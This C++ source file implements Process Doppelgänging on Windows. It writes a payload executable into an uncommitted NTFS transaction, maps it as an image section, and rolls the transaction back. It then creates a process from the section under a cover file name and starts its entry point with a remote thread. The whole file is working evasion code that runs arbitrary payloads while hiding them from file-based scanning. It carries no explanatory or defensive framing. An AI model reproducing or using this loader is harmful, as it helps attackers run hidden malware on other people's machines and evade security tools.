#include <Windows.h>
#include <ktmw32.h>
#include <stdio.h>

#include "nt_init_func.hpp"
#include "DoppelGangProcess.hpp"


#define NTSUCCESS(status) (status == (NTSTATUS)0x00000000L)

BYTE tempBuf[1000] = { 0 };
NTSTATUS status;


void frinting() {
	printf("NtCreateSection : %p\n", pNtCreateSection);
	printf("NtQueryInformationProcess : %p\n", pNtQueryInformationProcess);
	printf("NtCreateProcessEx : %p\n", pNtCreateProcessEx);
	printf("RtlCreateProcessParametersEx : %p\n", pRtlCreateProcessParametersEx);
	printf("RtlInitUnicodeString : %p\n", pRtlInitUnicodeString);
}

HANDLE CreateSectionFromTransaction(CHAR* transactFile, payload_data payload) {
	// Create a transaction and transacted file
	// Overwrite it with payload data but do not commit transaction
	HANDLE hTransaction = ::CreateTransaction(0, 0, TRANSACTION_DO_NOT_PROMOTE, 0, 0, 0, 0);
	if (hTransaction == INVALID_HANDLE_VALUE) {
		printf("Unable to create transaction %d\n", ::GetLastError());
		exit(0);
	}

	HANDLE hTransactedFile = ::CreateFileTransactedA(transactFile, GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0, hTransaction, 0, 0);
	if (hTransactedFile == INVALID_HANDLE_VALUE) {
		printf("Unable to create transacted file %d\n", ::GetLastError());
		exit(0);
	}

	if (!::WriteFile(hTransactedFile, payload.buf, payload.size, 0, 0)) {
		printf("Unable to write to transacted file %d\n", ::GetLastError());
		exit(0);
	}


	// Create Section with transacted file
	// Rollback transaction and close handles
	HANDLE hSection;
	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
	//NTSTATUS status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_COMMIT, hTransactedFile);
	if (!NTSUCCESS(status)) {
		printf("NtCreateSection failed : %x\n", status);
	}

	::RollbackTransaction(hTransaction);
	::CloseHandle(hTransactedFile);
	::CloseHandle(hTransaction);

	return hSection;
}

void CreateProcessFromSection(WCHAR* coverFile, payload_data payload, HANDLE hSection) {
	// Create Process from Section
	// Set Process Parameters and jump to entry point
	HANDLE hProcess;
	status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, 0, ::GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, 0, 0, 0);
	if (!NTSUCCESS(status)) {
		printf("NtCreateProcessEx failed : %x\n", status);
		exit(0);
	}

	// Find Entry Point for creating thread later
	// Use PEB of newly created process to locate the Module Base Address
	// Add Module Base Address to Entry Point RVA
	IMAGE_DOS_HEADER* pDOSHdr = (IMAGE_DOS_HEADER*)payload.buf;
	IMAGE_NT_HEADERS64* pNTHdr = (IMAGE_NT_HEADERS64*)(payload.buf + pDOSHdr->e_lfanew);
	DWORD64 entryPointRVA = pNTHdr->OptionalHeader.AddressOfEntryPoint;

	PROCESS_BASIC_INFORMATION pbi;
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0);
	::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &tempBuf, sizeof(PEB), 0);
	DWORD64 baseAddr = (DWORD64)((PPEB)tempBuf)->ImageBaseAddress;

	DWORD64 entryPoint = baseAddr + entryPointRVA;


	// Create Process Parameters block
	// Allocate memory in new process for Process Parameters block and write to it
	UNICODE_STRING uStr;
	pRtlInitUnicodeString(&uStr, coverFile);

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	status = pRtlCreateProcessParametersEx(&ProcessParameters, &uStr, 0, 0, &uStr, 0, 0, 0, 0, 0, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NTSUCCESS(status)) {
		printf("RtlCreateProcessParametersEx failed : %x\n", status);
		exit(0);
	}

	DWORD size = ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength;
	LPVOID MemoryPtr = ProcessParameters;
	MemoryPtr = ::VirtualAllocEx(hProcess, MemoryPtr, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!::WriteProcessMemory(hProcess, ProcessParameters, ProcessParameters, size, 0)) {
		printf("Unable to update process parameters : %d\n", ::GetLastError());
		exit(0);
	}


	// Update PEB's Process Parameters block
	PPEB peb = (PPEB)pbi.PebBaseAddress;
	if (!::WriteProcessMemory(hProcess, &peb->ProcessParameters, &ProcessParameters, sizeof(DWORD64), 0)) {
		printf("Unable to update PEB : %d\n", ::GetLastError());
		exit(0);
	}


	// Create the main thread at entry point
	HANDLE hThread = ::CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)entryPoint, 0, 0, 0);
	if (!hThread) {
		printf("Unable to create remote thread : %d\n", ::GetLastError());
		exit(0);
	}

	// Close handles for clean up
	::CloseHandle(hSection);
	::CloseHandle(hProcess);
	::CloseHandle(hThread);

	return;
}

void DoppelGangProcess(CHAR* transactFile, WCHAR* coverFile, payload_data payload) {
	//frinting();

	// Create Section
	HANDLE hSection = CreateSectionFromTransaction(transactFile, payload);

	// Create new Process with the Section
	CreateProcessFromSection(coverFile, payload, hSection);
	
	return;
}